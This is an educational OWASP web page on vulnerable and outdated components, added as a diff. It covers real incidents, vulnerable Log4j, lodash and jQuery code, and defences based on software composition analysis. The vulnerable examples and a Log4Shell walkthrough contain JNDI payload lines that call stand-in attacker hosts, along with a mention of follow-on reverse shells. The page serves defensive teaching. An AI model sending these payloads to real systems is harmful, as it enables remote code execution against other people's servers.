@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A06:2021 – Vulnerable &amp; Outdated Components · OWASP Top 10</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="logo"><span class="logo-icon">🛡️</span><span>OWASP<span class="logo-accent">Top10</span></span></a>
+            <button class="menu-toggle" id="menuToggle"><span></span><span></span><span></span></button>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.html#vulnerabilities">Vulnerabilities</a></li>
+                <li><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" target="_blank" rel="noopener">Official Docs ↗</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="vuln-page">
+        <div class="container">
+            <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../index.html#vulnerabilities">Vulnerabilities</a> / <span>A06</span></div>
+
+            <header class="vuln-hero">
+                <span class="vuln-id-large">OWASP-A06:2021</span>
+                <h1>Vulnerable &amp; Outdated Components</h1>
+                <p class="lead">Modern applications use dozens of open-source libraries, frameworks, and runtimes. When any of them has a known vulnerability — and you don't update — your application inherits that vulnerability, often with a public exploit ready to go.</p>
+                <div class="vuln-meta-row">
+                    <span class="vuln-diff medium">Difficulty: Medium</span>
+                    <div class="vuln-tags">
+                        <span class="tag">SCA</span>
+                        <span class="tag">Dependencies</span>
+                        <span class="tag">Supply Chain</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content-grid">
+                <div class="content-main">
+                    <section>
+                        <h2>Real-World Incidents</h2>
+                        <h3>Equifax Breach (2017) — Apache Struts CVE-2017-5638</h3>
+                        <p>Equifax was breached through a known vulnerability in Apache Struts 2 (<strong>CVE-2017-5638</strong>), disclosed in March 2017. The vulnerability allowed a remote attacker to execute arbitrary code via a malicious Content-Type header. Equifax had been notified, and the patch was available — but they didn't apply it to the disputed-data portal. Result: 147 million records exposed, $1.4B+ in costs.</p>
+
+                        <h3>Other Notable Incidents</h3>
+                        <ul>
+                            <li><strong>Log4Shell — CVE-2021-44228 (2021)</strong> — The single most severe vulnerability of the decade. A JNDI injection in <code>log4j2</code> allowed remote code execution via a single log line. Exploited in the wild within hours of disclosure. Affected millions of Java applications including iCloud, Steam, Tesla, and Minecraft.</li>
+                            <li><strong>Spring4Shell — CVE-2022-22965</strong> — RCE in Spring Core via data binding. A direct parallel to Struts 2017.</li>
+                            <li><strong>Heartbleed — CVE-2014-0160</strong> — Buffer over-read in OpenSSL. Affected ~17% of the internet's secure web servers. Affected Yahoo, Stack Overflow, and ~500,000+ other sites.</li>
+                            <li><strong>Shellshock — CVE-2014-6271</strong> — Bash bug. Affected every Linux/Unix server using CGI scripts. Active exploitation for years.</li>
+                            <li><strong>WooCommerce / WordPress (2021)</strong> — Multiple critical CVEs in popular plugins like WooCommerce, File Manager, and Elementor led to mass website defacements and credit card skimming.</li>
+                            <li><strong>SolarWinds Orion (2020)</strong> — Attackers compromised the build pipeline and injected malware (SUNBURST) into a software update. ~18,000 organizations installed the trojanized update, including the U.S. Treasury, DHS, and Microsoft.</li>
+                            <li><strong>3CX DesktopApp (2023)</strong> — A trojanized version of the 3CX softphone app delivered malware to 600,000+ companies including Toyota, Pepsi, and American Express.</li>
+                            <li><strong>event-stream npm (2018)</strong> — A popular npm package (2M+ downloads/week) was hijacked and gained a backdoor that stole Bitcoin wallets.</li>
+                        </ul>
+                    </section>
+
+                    <section>
+                        <h2>How It Works</h2>
+                        <h3>1. The Dependency Tree Problem</h3>
+                        <p>A typical Node.js application has 1,000+ transitive dependencies. A vulnerability in any of them — direct or indirect — affects your app. You might not even know they're there.</p>
+
+                        <h3>2. The "Not My Code" Mentality</h3>
+                        <p>Developers often assume the libraries they pull from npm, PyPI, or Maven Central are safe. They aren't — anyone can publish a package, and typosquatting attacks (e.g., <code>crossenv</code> vs <code>cross-env</code>) trick developers into installing malicious code.</p>
+
+                        <h3>3. Unsupported / End-of-Life Software</h3>
+                        <p>You're still running PHP 5.4, Django 1.6, or Windows Server 2008. The vendor no longer ships security patches, and known exploits are public.</p>
+
+                        <h3>4. No Upgrade Process</h3>
+                        <p>You have a 5-year-old Node 8 application that "still works." Nobody wants to touch it. It's full of known vulnerabilities with public exploits.</p>
+
+                        <h3>5. Supply Chain Compromise</h3>
+                        <p>An attacker compromises a maintainer's account, pushes a malicious version, and a downstream project auto-pulls it. This is what happened with event-stream, SolarWinds, and 3CX.</p>
+                    </section>
+
+                    <section>
+                        <h2>Vulnerable Examples</h2>
+
+                        <h3>Example 1: Log4Shell (the most impactful)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Java (with vulnerable log4j 2.x ≤ 2.14.1)</span><span>Vulnerable</span></div>
+                            <pre><code>// The application logs user-controlled input
+public class LoginController {
+    @PostMapping("/login")
+    public String login(@RequestParam String username) {
+        // The username could be: ${jndi:ldap://attacker.com/exploit}
+        log.info("Login attempt for: " + username);
+        return "login";
+    }
+}
+
+// ❌ log4j 2.x ≤ 2.14.1 evaluates JNDI lookups in log messages
+// The exploit: log message → log4j parses ${jndi:ldap://...} →
+// → makes a JNDI lookup to attacker.com → attacker returns a malicious Java class
+// → ClassLoader instantiates the class → Remote Code Execution
+
+// Payload via HTTP header (User-Agent, X-Forwarded-For, etc.):
+// User-Agent: ${jndi:ldap://attacker.com:1389/a}</code></pre>
+                        </div>
+
+                        <h3>Example 2: Lodash Prototype Pollution (CVE-2019-10744)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript (Lodash &lt; 4.17.12)</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Old version of lodash
+const _ = require('lodash@4.17.11');
+
+app.post('/merge', (req, res) => {
+    // Attacker sends: { "__proto__": { "isAdmin": true } }
+    // _.merge recursively copies into Object.prototype
+    _.merge({}, JSON.parse(req.body));
+    // Now every object in the app has isAdmin === true
+    res.send('merged');
+});</code></pre>
+                        </div>
+
+                        <h3>Example 3: Outdated jQuery with known XSS (CVE-2020-11022 / 11023)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">HTML</span><span>Vulnerable</span></div>
+                            <pre><code>&lt;!-- jQuery 1.x or 2.x — vulnerable to XSS in htmlPrefilter --&gt;
+&lt;script src="https://code.jquery.com/jquery-1.12.4.min.js"&gt;&lt;/script&gt;
+
+&lt;script&gt;
+    // The "html()" function processes HTML strings
+    // With older jQuery, an attribute selector regex could be tricked
+    // into creating a new script tag from input
+    $('#container').html(userInput);  // XSS possible
+&lt;/script&gt;</code></pre>
+                        </div>
+
+                        <h3>Example 4: Outdated WordPress + Plugin</h3>
+                        <p>Real-world finding — WooCommerce ≤ 4.7.0 had an SQL injection (CVE-2020-9742). Sites running unpatched WooCommerce exposed customer order data.</p>
+                    </section>
+
+                    <section>
+                        <h2>Attack Walkthrough — Log4Shell (Live Example)</h2>
+                        <div class="attack-flow">
+                            <div class="attack-step">
+                                <div class="step-num">1</div>
+                                <div class="step-content"><strong>Find a vulnerable target</strong><p>Shodan query: <code>http.html:"Apache/2.4"</code> + port scan. Many Java apps have Log4j2 deployed — the question is which version.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">2</div>
+                                <div class="step-content"><strong>Set up a malicious LDAP server</strong><p>Use <code>Interactsh</code> or <code>JNDI-Exploit-Kit</code>. The server logs every connection so you can confirm the target is vulnerable.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">3</div>
+                                <div class="step-content"><strong>Send a payload</strong><p>Many places will log it: HTTP headers, URL paths, form fields, even email subjects. Try: <code>User-Agent: ${jndi:ldap://yourserver.com/a}</code></p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">4</div>
+                                <div class="step-content"><strong>Watch for callbacks</strong><p>If your LDAP server gets a request, the target is vulnerable. You can now serve a Java class that runs a reverse shell, dumps memory, etc.</p></div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">5</div>
+                                <div class="step-content"><strong>Patch and disclose</strong><p>After disclosure, the fix is to upgrade to log4j 2.17.1+ or set <code>log4j2.formatMsgNoLookups=true</code> + remove the JndiLookup class.</p></div>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Secure Approach — Software Composition Analysis (SCA)</h2>
+
+                        <h3>1. Run a vulnerability scanner on every build</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">CLI</span><span>Using Snyk</span></div>
+                            <pre><code>$ npm install --save express
+$ npx snyk test
+
+# Output
+# Tested 1 dependencies for known issues, found 2 issues:
+# ✗ High severity vulnerability in lodash &lt; 4.17.21
+#   Path: lodash@4.17.11
+#   Info: Prototype Pollution
+#   From: app@1.0.0 &gt; express@4.17.1 &gt; lodash@4.17.11
+#
+# ✗ Medium severity in js-yaml &lt; 3.13.1
+#   Path: js-yaml@3.12.0
+#   Info: Code Injection via yaml.load()
+#
+# Upgrade @app@1.0.0 to fix:
+#   $ snyk wizard</code></pre>
+                        </div>
+
+                        <h3>2. Pin versions and lock files</h3>
+                        <p>Use <code>package-lock.json</code> (Node), <code>requirements.txt</code> with hashes (Python), <code>Gemfile.lock</code> (Ruby). Never use <code>^</code> or <code>~</code> in production without a careful update process.</p>
+
+                        <h3>3. Add CI gates</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">GitHub Actions</span><span>Secure</span></div>
+                            <pre><code>name: SCA Check
+on: [pull_request]
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+        with:
+          args: --severity-threshold=high
+          # Fails the build if any HIGH or CRITICAL CVE is found</code></pre>
+                        </div>
+
+                        <h3>4. Update on a schedule</h3>
+                        <p>Use tools like <code>Dependabot</code>, <code>Renovate</code>, or <code>Snyk</code> to open PRs automatically when patches are available.</p>
+                    </section>
+
+                    <section>
+                        <h2>Tools</h2>
+                        <div class="tools-grid">
+                            <div class="tool-card"><h5>Snyk</h5><p>Free tier. Excellent coverage of npm, PyPI, Maven, Docker, and more.</p></div>
+                            <div class="tool-card"><h5>npm audit / yarn audit</h5><p>Built into the Node ecosystem. Basic but useful.</p></div>
+                            <div class="tool-card"><h5>OWASP Dependency-Check</h5><p>Free, language-agnostic. Integrates with Jenkins, Maven, Gradle, etc.</p></div>
+                            <div class="tool-card"><h5>GitHub Dependabot</h5><p>Free for public repos. Auto-opens PRs for vulnerable dependencies.</p></div>
+                            <div class="tool-card"><h5>Trivy</h5><p>All-in-one scanner for filesystems, Docker images, IaC, and Kubernetes.</p></div>
+                            <div class="tool-card"><h5>Socket</h5><p>Detects supply-chain attacks by analyzing package behavior, not just CVEs.</p></div>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Prevention Checklist</h2>
+                        <div class="callout success">
+                            <div class="callout-title">✅ Component Hygiene</div>
+                            <ul style="margin-top: 12px; padding-left: 20px;">
+                                <li>Inventory every component — direct, transitive, runtime, dev. Use a Software Bill of Materials (SBOM).</li>
+                                <li>Run SCA on every build. Block merges on HIGH+ CVEs.</li>
+                                <li>Update components regularly. Patch within 2 weeks for HIGH, within 30 days for MEDIUM.</li>
+                                <li>Get rid of unsupported, end-of-life software. No PHP 5, no Node 8.</li>
+                                <li>Pin versions in production; use lock files.</li>
+                                <li>Subscribe to security advisories for your critical components.</li>
+                                <li>For supply-chain attacks, use tools that analyze package behavior (Socket, Phylum, etc.).</li>
+                            </ul>
+                        </div>
+                    </section>
+                </div>
+
+                <aside class="sidebar">
+                    <h4>On This Page</h4>
+                    <ul class="sidebar-toc">
+                        <li><a href="#real-incident">Real Incidents</a></li>
+                        <li><a href="#how-it-works">How It Works</a></li>
+                        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
+                        <li><a href="#attack-walkthrough">Attack Walkthrough</a></li>
+                        <li><a href="#secure-code">Secure Approach</a></li>
+                        <li><a href="#prevention">Prevention</a></li>
+                    </ul>
+                    <div class="sidebar-info">
+                        <h4>Quick Facts</h4>
+                        <div class="sidebar-info-row"><span class="label">CWE Count</span><span class="value">3</span></div>
+                        <div class="sidebar-info-row"><span class="label">Top Example</span><span class="value">Log4Shell 2021</span></div>
+                        <div class="sidebar-info-row"><span class="label">Difficulty</span><span class="value">Medium</span></div>
+                    </div>
+                </aside>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer"><div class="container"><div class="footer-bottom"><p>© 2025 OWASP Top 10 Educational Project</p></div></div></footer>
+    <script src="../js/main.js"></script>
+</body>
+</html>
